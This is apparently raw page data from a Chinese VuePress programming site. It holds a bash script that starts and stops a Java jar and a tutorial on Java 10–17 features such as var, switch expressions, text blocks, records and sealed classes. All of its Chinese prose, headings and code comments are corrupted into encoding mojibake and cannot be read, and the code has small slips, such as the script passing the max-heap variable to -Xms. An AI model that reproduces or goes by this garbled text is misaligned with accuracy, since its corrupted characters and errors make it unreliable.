å­å¨æç§æ¥åä¸çåå·®ï¼éè¦è¿ä¸æ­¥æ£æ¥åç¡®è®¤ã\n\nä» 0 å° 15ãæ¯ä¸æ ¼çé¢è²ä»£è¡¨äºå¤äºè¯¥å¹´é¾çº§å«çå¯¹è±¡æ°éãä¾å¦ï¼ç¬¬ä¸åï¼å¹´é¾çº§å« 0ï¼æä¸ä¸ªæ©è²çæ ¼å­ï¼è¡¨ç¤ºæä¸äºå¯¹è±¡ååè¿å¥å¹´è½»ä»£ï¼å®ä»¬çå¹´é¾ä¸º 0ãç¬¬äºåï¼å¹´é¾çº§å« 1ï¼æä¸¤ä¸ªæ©è²æ ¼å­ï¼è¯´ææä¸¤ç»å¯¹è±¡å·²ç»ç»åäºç¬¬ä¸æ¬¡åå¾æ¶éï¼ç°å¨å®ä»¬çå¹´é¾ä¸º 1ã\n\nè¯·æ³¨æï¼è¿ä¸ªç´æ¹å¾å¹¶ä¸åæ å®éçæ°éï¼èæ¯éè¿é¢è²åæ¥è¡¨ç¤ºç¸å¯¹æ°éãå æ­¤ï¼ä¸¤ä¸ªæ©è²æ ¼å­å¹¶ä¸ä¸å®è¡¨ç¤ºç¡®åçä¸¤ä¸ªå¯¹è±¡ï¼èåªæ¯è¡¨ææå¤ä¸ªå¯¹è±¡å¤äºè¿ä¸ªå¹´é¾çº§å«ã',charsets:{cjk:!0}},{title:"jarå¯å¨èæ¬",frontmatter:{title:"jarå¯å¨èæ¬",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/other/5/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/04.%E5%85%B6%E4%BB%96/5.jar%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC.html",relativePath:"00.è¯­è¨/01.JAVA/04.å¶ä»/5.jarå¯å¨èæ¬.md",key:"v-c1fddfba",path:"/language/java/other/5/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'#!/bin/bash\n#å¥åè®¾ç½®\nFUNC=$1\nAPP_NAME=$2\nXMS=512M\nXMX=512M\nSCRIPT=$0\n\nif [ "X$3" != "X" ]; then\n    XMS=$3\nfi\n\nif [ "X$4" != "X" ]; then\n    XMX=$4\nfi\n\n# echo $FUNC $APP_NAME $XMS $XMX\n\n#ä½¿ç¨è¯´æï¼ç¨æ¥æç¤ºè¾å¥åæ°\nusage() {\n    echo "Usage: sh æ§è¡èæ¬.sh [start|stop|restart|status]"\n    exit 1\n}\n\n#æ£æ¥ç¨åºæ¯å¦å¨è¿è¡\nis_exist(){\n    # pid=`ps -ef|grep $APP_NAME|grep -v grep|awk \'{print $2}\' `\n    pid=`ps -ef|grep $APP_NAME|grep -v grep|grep -v monitor|grep -v $SCRIPT|awk \'{print $2}\' `\n    #å¦æä¸å­å¨è¿å1ï¼å­å¨è¿å0\n    # echo \'pid is ----\'${pid}\n    if [ -z "${pid}" ]; then\n        return 1\n    else\n        return 0\n    fi\n}\n\n#å¯å¨æ¹æ³\nstart(){\n    is_exist\n    if [ "$?" -eq \'0\' ]; then\n        echo "${APP_NAME} is already running. pid=${pid} ."\n    else\n        # å¯å¨åºç¨ç¨åº\n        nohup java -Xms$XMX -Xmx$XMX $JAVA_OPTS -jar -Duser.timezone=America/Sao_Paulo  $APP_NAME.jar --spring.profiles.active=test > $APP_NAME.out 2>&1 &\n        echo "${APP_NAME} start."\n        tail -f $APP_NAME.out\n    fi\n}\n\n#åæ­¢æ¹æ³\nstop(){\n    is_exist\n    if [ $? -eq "0" ]; then\n        kill -9 $pid\n    else\n        echo "${APP_NAME} is not running"\n    fi\n}\n\n#è¾åºè¿è¡ç¶æ\nstatus(){\n    is_exist\n    if [ $? -eq "0" ]; then\n        echo "${APP_NAME} is running. Pid is ${pid}"\n    else\n        echo "${APP_NAME} is NOT running."\n    fi\n}\n\n#éå¯\nrestart(){\n    stop\n    start\n}\n\n#æ ¹æ®è¾å¥åæ°ï¼éæ©æ§è¡å¯¹åºæ¹æ³ï¼ä¸è¾å¥åæ§è¡ä½¿ç¨è¯´æ\ncase "$1" in\n    "start")\n        start\n    ;;\n    "stop")\n        stop\n    ;;\n    "status")\n        status\n    ;;\n    "restart")\n        restart\n    ;;\n    *)\n        usage\n    ;;\nesac\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n',normalizedContent:'#!/bin/bash\n#å¥åè®¾ç½®\nfunc=$1\napp_name=$2\nxms=512m\nxmx=512m\nscript=$0\n\nif [ "x$3" != "x" ]; then\n    xms=$3\nfi\n\nif [ "x$4" != "x" ]; then\n    xmx=$4\nfi\n\n# echo $func $app_name $xms $xmx\n\n#ä½¿ç¨è¯´æï¼ç¨æ¥æç¤ºè¾å¥åæ°\nusage() {\n    echo "usage: sh æ§è¡èæ¬.sh [start|stop|restart|status]"\n    exit 1\n}\n\n#æ£æ¥ç¨åºæ¯å¦å¨è¿è¡\nis_exist(){\n    # pid=`ps -ef|grep $app_name|grep -v grep|awk \'{print $2}\' `\n    pid=`ps -ef|grep $app_name|grep -v grep|grep -v monitor|grep -v $script|awk \'{print $2}\' `\n    #å¦æä¸å­å¨è¿å1ï¼å­å¨è¿å0\n    # echo \'pid is ----\'${pid}\n    if [ -z "${pid}" ]; then\n        return 1\n    else\n        return 0\n    fi\n}\n\n#å¯å¨æ¹æ³\nstart(){\n    is_exist\n    if [ "$?" -eq \'0\' ]; then\n        echo "${app_name} is already running. pid=${pid} ."\n    else\n        # å¯å¨åºç¨ç¨åº\n        nohup java -xms$xmx -xmx$xmx $java_opts -jar -duser.timezone=america/sao_paulo  $app_name.jar --spring.profiles.active=test > $app_name.out 2>&1 &\n        echo "${app_name} start."\n        tail -f $app_name.out\n    fi\n}\n\n#åæ­¢æ¹æ³\nstop(){\n    is_exist\n    if [ $? -eq "0" ]; then\n        kill -9 $pid\n    else\n        echo "${app_name} is not running"\n    fi\n}\n\n#è¾åºè¿è¡ç¶æ\nstatus(){\n    is_exist\n    if [ $? -eq "0" ]; then\n        echo "${app_name} is running. pid is ${pid}"\n    else\n        echo "${app_name} is not running."\n    fi\n}\n\n#éå¯\nrestart(){\n    stop\n    start\n}\n\n#æ ¹æ®è¾å¥åæ°ï¼éæ©æ§è¡å¯¹åºæ¹æ³ï¼ä¸è¾å¥åæ§è¡ä½¿ç¨è¯´æ\ncase "$1" in\n    "start")\n        start\n    ;;\n    "stop")\n        stop\n    ;;\n    "status")\n        status\n    ;;\n    "restart")\n        restart\n    ;;\n    *)\n        usage\n    ;;\nesac\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n',charsets:{cjk:!0}},{title:"JAVA 10/11/12/13/14/15/16/17 æ°ç¹æ§æ»ç»",frontmatter:{title:"JAVA 10/11/12/13/14/15/16/17 æ°ç¹æ§æ»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/version/3/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/03.%E7%89%88%E6%9C%AC/3.JAVA%2010-17%20%E6%96%B0%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93.html",relativePath:"00.è¯­è¨/01.JAVA/03.çæ¬/3.JAVA 10-17 æ°ç¹æ§æ»ç».md",key:"v-585fb790",path:"/language/java/version/3/",headers:[{level:2,title:"JAVA 10",slug:"java-10",normalizedTitle:"java 10",charIndex:2},{level:3,title:"å±é¨åéç±»åæ¨æ­",slug:"å±é¨åéç±»åæ¨æ­",normalizedTitle:"å±é¨åéç±»åæ¨æ­",charIndex:14},{level:2,title:"JAVA 11",slug:"java-11",normalizedTitle:"java 11",charIndex:313},{level:3,title:"ç¨äºLambdaçå½¢åå±é¨åéè¯­æ³",slug:"ç¨äºlambdaçå½¢åå±é¨åéè¯­æ³",normalizedTitle:"ç¨äº lambda çå½¢åå±é¨åéè¯­æ³",charIndex:396},{level:3,title:"éå¯¹Stringç±»çæ¹æ³å¢å¼º",slug:"éå¯¹stringç±»çæ¹æ³å¢å¼º",normalizedTitle:"éå¯¹ string ç±»çæ¹æ³å¢å¼º",charIndex:696},{level:3,title:"å¨æ°çHttpClientä½¿ç¨",slug:"å¨æ°çhttpclientä½¿ç¨",normalizedTitle:"å¨æ°ç httpclient ä½¿ç¨",charIndex:1358},{level:2,title:"java12",slug:"java12",normalizedTitle:"java12",charIndex:1944},{level:3,title:"æ°çswitchè¯­æ³",slug:"æ°çswitchè¯­æ³",normalizedTitle:"æ°ç switch è¯­æ³",charIndex:2055},{level:2,title:"java13",slug:"java13",normalizedTitle:"java13",charIndex:3334},{level:3,title:"ææ¬å",slug:"ææ¬å",normalizedTitle:"ææ¬å",charIndex:3345},{level:2,title:"java14",slug:"java14",normalizedTitle:"java14",charIndex:3884},{level:3,title:"æ°ç instanceof è¯­æ³",slug:"æ°ç-instanceof-è¯­æ³",normalizedTitle:"æ°ç instanceof è¯­æ³",charIndex:3895},{level:3,title:"ç©ºæéå¼å¸¸çæ¹è¿",slug:"ç©ºæéå¼å¸¸çæ¹è¿",normalizedTitle:"ç©ºæéå¼å¸¸çæ¹è¿",charIndex:4386},{level:3,title:"è®°å½ç±»å Record",slug:"è®°å½ç±»å-record",normalizedTitle:"è®°å½ç±»å record",charIndex:4477},{level:2,title:"java17",slug:"java17",normalizedTitle:"java17",charIndex:5324},{level:3,title:"å¯å°ç±»å",slug:"å¯å°ç±»å",normalizedTitle:"å¯å°ç±»å",charIndex:5335}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"JAVA 10 å±é¨åéç±»åæ¨æ­ JAVA 11 ç¨äºLambdaçå½¢åå±é¨åéè¯­æ³ éå¯¹Stringç±»çæ¹æ³å¢å¼º å¨æ°çHttpClientä½¿ç¨ java12 æ°çswitchè¯­æ³ java13 ææ¬å java14 æ°ç instanceof è¯­æ³ ç©ºæéå¼å¸¸çæ¹è¿ è®°å½ç±»å Record java17 å¯å°ç±»å",content:'# JAVA 10\n\n\n# å±é¨åéç±»åæ¨æ­\n\nå¨ java ä¸­ï¼æä»¬å¯ä»¥ä½¿ç¨èªå¨ç±»åæ¨æ­\n\n    public static void main(String[] args) {\n        var a = "hello world";\n        System.out.println("a = " + a);\n    }\n\n\n1\n2\n3\n4\n\n\nä½æ¯æ³¨æï¼var å³é®å­å¿é¡»ä½äºæåå§å¼è®¾å®çåéä¸ï¼å¦åç¼è¯é½ä¸ä¼éè¿ãjava ç»ç©¶ä¸å JS é£æ ·è¿è¡å¨ææ¨æ­ï¼è¿ç§ç±»åæ¨æ­ä»ä»åçå¨ç¼è¯æé´ï¼å°æåç¼è¯å®æè¿æ¯ä¼åæå·ä½ç±»åçã\n\nvar å³é®å­ä¸è½åä¸ºå±æ§ææååéä½¿ç¨ï¼åªè½åä¸ºå±é¨åéä½¿ç¨ã\n\n\n# JAVA 11\n\nJava11 æ¯ç»§ Java8 ä¹åçåä¸ä¸ª TLS é¿æç»´æ¤çæ¬ï¼å¨ Java 17 åºç°ä¹åï¼ä¸ç´é½æ¯æ­¤çæ¬åä¸ºå¹¿æ³ä½¿ç¨ççæ¬ï¼å¶ä¸­æ¯è¾å³é®çæ¯ç¨äº Lambda çå½¢åå±é¨åéè¯­æ³ã\n\n\n# ç¨äº Lambda çå½¢åå±é¨åéè¯­æ³\n\nå¨ Java10 æä»¬è®¤è¯äº var å³é®å­ï¼å®è½å¤è®©å±é¨åéèªå¨è¿è¡ç±»åæ¨æ­ï¼ä¸è¿å®ä¸æ¯æå¨ lambda ä¸­ä½¿ç¨ï¼æä»¥å¨ Java11 ç»äºæ¯æäºã\n\n    public static void main(String[] args) {\n        Consumer<String> consumer = (var s) -> System.out.println(s.length());\n        consumer.accept("ä½ å¥½");\n    }\n\n\n1\n2\n3\n4\n\n\n\n# éå¯¹ String ç±»çæ¹æ³å¢å¼º\n\n    public static void main(String[] args) {\n        var str = "AB\\nC  \\nD  ";\n        // å¤æ­æ¯å¦å­ç¬¦ä¸²ä¸ºç©ºæèä»åå«ç©ºæ ¼\n        System.out.println(str.isBlank());\n        str\n                // æ ¹æ®å­ç¬¦ä¸²ä¸­ç \\n æ¢è¡ç¬¦è¿è¡åå²ï¼åä¸ºå¤ä¸ªå­ç¬¦ä¸²ï¼å¹¶è½¬æ¢ä¸ºStreamè¿è¡æä½\n                .lines()\n                .forEach(System.out::println);\n\n        // æ ¹æ®ä¼ å¥æ¬¡æ°ï¼å¤å¶åæå­ç¬¦ä¸²å¹¶æ¼æ¥å°æ«å°¾ "AB\\nC\\nDAB\\nC\\nD"\n        System.out.println(str.repeat(2));\n\n        // å»é¤é¦ä½ç©ºæ ¼\n        System.out.println(str.strip());\n        // å»é¤é¦é¨ç©ºæ ¼\n        System.out.println(str.stripLeading());\n        // å»é¤å°¾é¨ç©ºæ ¼\n        System.out.println(str.stripTrailing());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# å¨æ°ç HttpClient ä½¿ç¨\n\nå¨ java9 çæ¶åå¶å®å°±å·²ç»å¼å¥äºå¨æ°ç HttpClient APIï¼ç¨äºåä»£ä¹åæ¯è¾èç HttpURLConnection ç±»ï¼æ°ç API æ¯æææ°ç HTTP2 å WebSocket åè®®ã\n\n    public static void main(String[] args) throws URISyntaxException, IOException, InterruptedException {\n        // åå»ºä¸ä¸ªå®¢æ·ç«¯\n        var httpClient = HttpClient.newHttpClient();\n        // åå»ºä¸ä¸ªè¯·æ±\n        var request = HttpRequest.newBuilder(new URI("http://www.baidu.com")).GET().build();\n        // åéå¾å°ååº\n        var send = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        System.out.println(send.body());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# java12\n\njava 12-16 è¿äºä¸ªçæ¬å¹¶éé¿æçæ¬ï¼æä»¥å¾å¤ç¹æ§é½æ¯ä¸ç§å¤äºå®éªæ§åè½ï¼12/13 çæ¬å¼å¥äºä¸äºå®éªæ§åè½ï¼å¹¶æ ¹æ®åé¦è¿è¡è°æ´ï¼æåå¨åç»­çæ¬ä¸­æ­£å¼å¼æ¾ä½¿ç¨ï¼å¶å®å°±æ¯ä½éªæçé£ç§æè§ã\n\n\n# æ°ç switch è¯­æ³\n\næ°çè¯­æ³å¯ä»¥å¤§å¤§æ¹ä¾¿æä»¬çç¼åï¼ä½æ¯è¿æ¯ç¾ä¸­ä¸è¶³çæ¯ä¸è½æ¯æèå´å¹é\n\n    /**\n     * ä¼ å¥åæ°\n     * 90-100 ä¼ç§\n     * 70-90 è¯å¥½\n     * 60-70 åæ ¼\n     * 0-60 å·®\n    **/\n    public static String old(int score){\n        score/=10;\n        String str;\n        switch (score){\n            case 10:\n            case 9:\n                str = "ä¼ç§";\n                break;\n            case 8:\n            case 7:\n                str = "è¯å¥½";\n                break;\n            case 6:\n                str = "å ä¸ª";\n                break;\n            default:\n                str = "ä¸åæ ¼";\n        }\n        return str;\n    }\n\n    public static String java12(int score){\n        score/=10;\n        return switch (score){\n            case 10,9 -> "ä¼ç§";\n            case 8,7 -> "è¯å¥½";\n            case 6 -> "å ä¸ª";\n            default -> "ä¸åæ ¼";\n        };\n    }\n\n    public static String java12_1(int score){\n        score/=10;\n        return switch (score){\n            case 10,9 -> "ä¼ç§";\n            case 8,7 -> "è¯å¥½";\n            case 6 -> "å ä¸ª";\n            default -> {\n                System.out.println("å¶ä»æ¹å¼");\n                yield "ä¸åæ ¼";\n            }\n        };\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n\n# java13\n\n\n# ææ¬å\n\nå½æä»¬éè¦ä½¿ç¨å¤æå­ç¬¦ä¸²æ¶ï¼å¯è½å­ç¬¦ä¸²ä¸­åå«äºå¾å¤éè¦è½¬ç§»çå­ç¬¦ï¼æ¯å¦åå¼å·ç­ï¼è¿æ¶æä»¬å°±å¯ä»¥ä½¿ç¨ä¸å¼å·æ¥åæ¬å­ç¬¦ä¸²\n\n    public static void main(String[] args) throws URISyntaxException, IOException, InterruptedException {\n        var s = """\n                    dsafdsafdsa\n                        dfdsafd\n                            ""fdsa \\n \\n dsfdsa\n                            \\r ffff \\t dsfad \n                """;\n        System.out.println(s);\n    }\n\nç»ææå°ï¼\n    dsafdsafdsa\n        dfdsafd\n            ""fdsa \n \n dsfdsa\n ffff \t dsfad\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# java14\n\n\n# æ°ç instanceof è¯­æ³\n\n    public boolean old(Object o) {\n        if (this == o) {return true;}\n        if (o instanceof User) {\n            User user = (User) o;\n            return user.name.equals(this.name);\n        }\n        return false;\n    }\n\n    public boolean java16(Object o) {\n        if (this == o) {return true;}\n        if (o instanceof User user) {\n            return user.name.equals(this.name);\n        }\n        return false;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# ç©ºæéå¼å¸¸çæ¹è¿\n\nå¨æ§çæ¬ä¸­å¦æåºç°ç©ºæéå¼å¸¸ï¼æ¥éåªä¼ç»æä»¬ç©ºæéåçå¨åªä¸è¡ï¼å·ä½åªä¸ªåéä¸ºç©ºå¹¶ä¸ä¼åè¯æä»¬ï¼éè¦æä»¬èªå·±æ debugï¼å¨æ°ççæ¬ä¸­ä¼æç¡®åç¥æä»¬ã\n\n\n# è®°å½ç±»å Record\n\nç»§ç±»ãæ¥å£ãæä¸¾ãæ³¨è§£ä¹åçåä¸æ°ç±»åæ¥äºï¼ä»çåå­å« è®°å½ ï¼å¨ java14 ä¸­é¦æ¬¡åºåºï¼è¿ä¸åºåºï¼Lombok çå©æ¢¦æ¥äºã å¨å®éå¼åä¸­ï¼å¾å¤ç±»ä»ä»åªæ¯åå½ä¸ä¸ªå®ä½ç±»ç½¢äºï¼ä¿å­çæ¯ä¸äºä¸å¯åæ°æ®ï¼æ¯å¦æä»¬ä»æ°æ®åºä¸­æ¥è¯¢çè´¦æ·ä¿¡æ¯ï¼æåè¢«æ å°ä¸ºä¸ä¸ªå®ä½ç±»\n\n@Data\npublic class User {\n\n    private String name;\n  \n    private Integer age;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nLombok å¯ä»¥è¯´æ¶ç®åä»£ç çç¥å¨ï¼å®è½å¨ç¼è¯æ¶èªå¨çæ getãsetãæé å¨ãtoString () æ¹æ³ç­ï¼å¨ç¼åè¿äºå®ä½ç±»æ¶ï¼ç®ç´ä¸è¦å¤ªå¥½ç¨ï¼Record å¯ä»¥è®©æä»¬ä¸éè¦æ¾å¼å°å®ä¹æé å½æ°ãgetters æ¹æ³æ equals å hashCode æ¹æ³ãææè¿äºé½ä¼ç± Records èªå¨çæã\n\nè®°å½ç±»åæ¬è´¨ä¸ä¹æ¯ä¸ä¸ªæ®éç±»ï¼ä¸è¿æ¯ final ç±»åä¸ç»§æ¿èª java.lang.Record æ½è±¡ç±»çï¼ä»ä¼å¨ç¼è¯æ¶ï¼ä¼èªå¨ç¼è¯åº getãhashCodeãequalsãtoString ç­æ¹æ³ã\n\n// åªè½æå­æ®µåéæ¬å·ä¸­\npublic record User(String name,Integer age) {\n    public static void a(){\n    }\n    public static void main(String[] args) {\n        User user = new User("å¼ ä¸",2);\n        System.out.println(user.name());\n        System.out.println(user);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nä½æäºåè½è¿æ¯æ²¡æåæ³ä¸ Lombok ç¸æ¯çï¼å¦ @SL4Jï¼é¾å¼è°ç¨ï¼æ åæé å½æ°ä¸æ¯æç­ã\n\n\n# java17\n\n\n# å¯å°ç±»å\n\nå¯å°ç±»åå¯ä»¥è¯´æ¶ java17 æ­£å¼æ¨åºçåä¸éç£ç±»åï¼å®å¨ java15 é¦æ¬¡æåºå¹¶æµè¯äºä¸¤ä¸ªçæ¬ã\n\nå¨ java ä¸­ï¼æä»¬å¯ä»¥éè¿ç»§æ¿ï¼extends å³é®å­ï¼æ¥å®ç°ç±»çè½åå¤ç¨ï¼æ©å±ä¸å¢å¼ºãä½æçæ¶åï¼å¯è½å¹¶ä¸æ¯ææçç±»æä»¬é½å¸æè½å¤è¢«ç»§æ¿ãæä»¥ï¼æä»¬éè¦å¯¹ç»§æ¿å³ç³»æä¸äºéå¶çæ§å¶ææ®µï¼èå¯å°ç±»çä½ç¨å°±æ¯éå¶ç±»çç»§æ¿ãå®éä¸å¨ä¹åæä»¬å¦æä¸å¸æå«äººç»§æ¿æä»¬çç±»ï¼å¯ä»¥ç´æ¥æ·»å  final å³é®å­ã\n\nè¿æ ·æä¸ä¸ªç¼ºç¹ï¼å¦ææ·»å äº final å³é®å­ï¼é£ä¹æ è®ºæ¯è°ï¼åæ¬æä»¬èªå·±ä¹æ¯æ²¡åæ³å®ç°ç»§æ¿çï¼ä½æ¯ç°å¨æä»¬æä¸ä¸ªéæ±ï¼åªåè®¸æä»¬èªå·±åçç±»ç»§æ¿ï¼ä½æ¯ä¸åè®¸å«äººåçç±»ç»§æ¿ï¼è¿æ¶è¯¥ååï¼å¨ java17 ä¹åæ³è¦å®ç°å°±å¾éº»ç¦ã\n\n# æ§çæ¬\npublic final class A{\n}\n\n# æ°çæ¬ sealed\npublic sealed class A permits B {\n}\n# ç»§æ¿ A\npublic final class B extends A {\n}\npublic sealed class B extends A {\n}\npublic non-sealed B extends A {\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nå¯å°ç±»åæä»¥ä¸è¦æ±ï¼\n\n * å¯ä»¥åºäºæ®éç±»ãæ½è±¡ç±»ãæ¥å£ï¼ä¹å¯ä»¥ç»§æ¿èªå¶ä»æ¥å£çå­ç±»ææ¯å®ç°å¶ä»æ¥å£çç±»ç­ã\n * å¿é¡»æå­ç±»ç»§æ¿ï¼ä¸ä¸è½æ¯å¿ååé¨ç±»ææ¯ lambda çå½¢å¼\n * sealed åå¨åæ¥ final çä½ç½®ï¼ä½ä¸è½å finalãnon-sealed å³é®å­åæ¶åºç°ï¼åªè½éå¶ä¸\n * ç»§æ¿çå­ç±»å¿é¡»æ¾ç¤ºçæ è®°ä¸º finalï¼è¡¨ç¤ºè¿ä¸ªç±»ä¸è½è¢«ç»§æ¿ï¼ãsealedï¼è¡¨ç¤ºè¿ä¸ªå­ç±»ä¹å¯ä»¥æå¶ä»å¯å°çæéå¯å°çå­ç±»ï¼ ææ¯ non-sealed ï¼è¡¨ç¤ºè¿ä¸ªå­ç±»ä¸è½æå­ç±»ï¼ä½å®å¯ä»¥è¢«å¶ä»ç±»ç»§æ¿ï¼ç±»å',normalizedContent:'# java 10\n\n\n# å±é¨åéç±»åæ¨æ­\n\nå¨ java ä¸­ï¼æä»¬å¯ä»¥ä½¿ç¨èªå¨ç±»åæ¨æ­\n\n    public static void main(string[] args) {\n        var a = "hello world";\n        system.out.println("a = " + a);\n    }\n\n\n1\n2\n3\n4\n\n\nä½æ¯æ³¨æï¼var å³é®å­å¿é¡»ä½äºæåå§å¼è®¾å®çåéä¸ï¼å¦åç¼è¯é½ä¸ä¼éè¿ãjava ç»ç©¶ä¸å js é£æ ·è¿è¡å¨ææ¨æ­ï¼è¿ç§ç±»åæ¨æ­ä»ä»åçå¨ç¼è¯æé´ï¼å°æåç¼è¯å®æè¿æ¯ä¼åæå·ä½ç±»åçã\n\nvar å³é®å­ä¸è½åä¸ºå±æ§ææååéä½¿ç¨ï¼åªè½åä¸ºå±é¨åéä½¿ç¨ã\n\n\n# java 11\n\njava11 æ¯ç»§ java8 ä¹åçåä¸ä¸ª tls é¿æç»´æ¤çæ¬ï¼å¨ java 17 åºç°ä¹åï¼ä¸ç´é½æ¯æ­¤çæ¬åä¸ºå¹¿æ³ä½¿ç¨ççæ¬ï¼å¶ä¸­æ¯è¾å³é®çæ¯ç¨äº lambda çå½¢åå±é¨åéè¯­æ³ã\n\n\n# ç¨äº lambda çå½¢åå±é¨åéè¯­æ³\n\nå¨ java10 æä»¬è®¤è¯äº var å³é®å­ï¼å®è½å¤è®©å±é¨åéèªå¨è¿è¡ç±»åæ¨æ­ï¼ä¸è¿å®ä¸æ¯æå¨ lambda ä¸­ä½¿ç¨ï¼æä»¥å¨ java11 ç»äºæ¯æäºã\n\n    public static void main(string[] args) {\n        consumer<string> consumer = (var s) -> system.out.println(s.length());\n        consumer.accept("ä½ å¥½");\n    }\n\n\n1\n2\n3\n4\n\n\n\n# éå¯¹ string ç±»çæ¹æ³å¢å¼º\n\n    public static void main(string[] args) {\n        var str = "ab\\nc  \\nd  ";\n        // å¤æ­æ¯å¦å­ç¬¦ä¸²ä¸ºç©ºæèä»åå«ç©ºæ ¼\n        system.out.println(str.isblank());\n        str\n                // æ ¹æ®å­ç¬¦ä¸²ä¸­ç \\n æ¢è¡ç¬¦è¿è¡åå²ï¼åä¸ºå¤ä¸ªå­ç¬¦ä¸²ï¼å¹¶è½¬æ¢ä¸ºstreamè¿è¡æä½\n                .lines()\n                .foreach(system.out::println);\n\n        // æ ¹æ®ä¼ å¥æ¬¡æ°ï¼å¤å¶åæå­ç¬¦ä¸²å¹¶æ¼æ¥å°æ«å°¾ "ab\\nc\\ndab\\nc\\nd"\n        system.out.println(str.repeat(2));\n\n        // å»é¤é¦ä½ç©ºæ ¼\n        system.out.println(str.strip());\n        // å»é¤é¦é¨ç©ºæ ¼\n        system.out.println(str.stripleading());\n        // å»é¤å°¾é¨ç©ºæ ¼\n        system.out.println(str.striptrailing());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# å¨æ°ç httpclient ä½¿ç¨\n\nå¨ java9 çæ¶åå¶å®å°±å·²ç»å¼å¥äºå¨æ°ç httpclient apiï¼ç¨äºåä»£ä¹åæ¯è¾èç httpurlconnection ç±»ï¼æ°ç api æ¯æææ°ç http2 å websocket åè®®ã\n\n    public static void main(string[] args) throws urisyntaxexception, ioexception, interruptedexception {\n        // åå»ºä¸ä¸ªå®¢æ·ç«¯\n        var httpclient = httpclient.newhttpclient();\n        // åå»ºä¸ä¸ªè¯·æ±\n        var request = httprequest.newbuilder(new uri("http://www.baidu.com")).get().build();\n        // åéå¾å°ååº\n        var send = httpclient.send(request, httpresponse.bodyhandlers.ofstring());\n        system.out.println(send.body());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# java12\n\njava 12-16 è¿äºä¸ªçæ¬å¹¶éé¿æçæ¬ï¼æä»¥å¾å¤ç¹æ§é½æ¯ä¸ç§å¤äºå®éªæ§åè½ï¼12/13 çæ¬å¼å¥äºä¸äºå®éªæ§åè½ï¼å¹¶æ ¹æ®åé¦è¿è¡è°æ´ï¼æåå¨åç»­çæ¬ä¸­æ­£å¼å¼æ¾ä½¿ç¨ï¼å¶å®å°±æ¯ä½éªæçé£ç§æè§ã\n\n\n# æ°ç switch è¯­æ³\n\næ°çè¯­æ³å¯ä»¥å¤§å¤§æ¹ä¾¿æä»¬çç¼åï¼ä½æ¯è¿æ¯ç¾ä¸­ä¸è¶³çæ¯ä¸è½æ¯æèå´å¹é\n\n    /**\n     * ä¼ å¥åæ°\n     * 90-100 ä¼ç§\n     * 70-90 è¯å¥½\n     * 60-70 åæ ¼\n     * 0-60 å·®\n    **/\n    public static string old(int score){\n        score/=10;\n        string str;\n        switch (score){\n            case 10:\n            case 9:\n                str = "ä¼ç§";\n                break;\n            case 8:\n            case 7:\n                str = "è¯å¥½";\n                break;\n            case 6:\n                str = "å ä¸ª";\n                break;\n            default:\n                str = "ä¸åæ ¼";\n        }\n        return str;\n    }\n\n    public static string java12(int score){\n        score/=10;\n        return switch (score){\n            case 10,9 -> "ä¼ç§";\n            case 8,7 -> "è¯å¥½";\n            case 6 -> "å ä¸ª";\n            default -> "ä¸åæ ¼";\n        };\n    }\n\n    public static string java12_1(int score){\n        score/=10;\n        return switch (score){\n            case 10,9 -> "ä¼ç§";\n            case 8,7 -> "è¯å¥½";\n            case 6 -> "å ä¸ª";\n            default -> {\n                system.out.println("å¶ä»æ¹å¼");\n                yield "ä¸åæ ¼";\n            }\n        };\n    